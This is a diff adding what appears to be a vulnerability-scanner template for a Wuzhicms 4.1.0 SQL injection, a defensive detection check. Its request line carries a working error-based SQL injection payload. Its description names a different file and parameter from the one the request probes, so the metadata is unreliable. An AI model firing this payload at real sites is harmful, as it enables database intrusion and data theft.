@@ -1,0 +1,26 @@
+id: CNVD-2022-36985
+brief:
+    title: Wuzhicms 4.1.0 - SQL Injection
+    by: princechaddha
+    level: critical
+    about: Wuzhicms 4.1.0 contains a SQL injection vulnerability via the grouppid parameter of /coreframe/app/member/admin/group.php. An attacker can possibly obtain sensitive information from a database, mod...
+    label:
+        - cnvd
+        - cnvd2022
+        - wuzhicms
+        - sqli
+        - vuln
+    score: CVSS:10.0
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/api/sms_check.php?param=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20md5({{num}})),0x7e),1)--%20'
+      signs:
+        - "on": word
+          has:
+            - c8c605999f3d8352d7bb792cf3fdb25
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
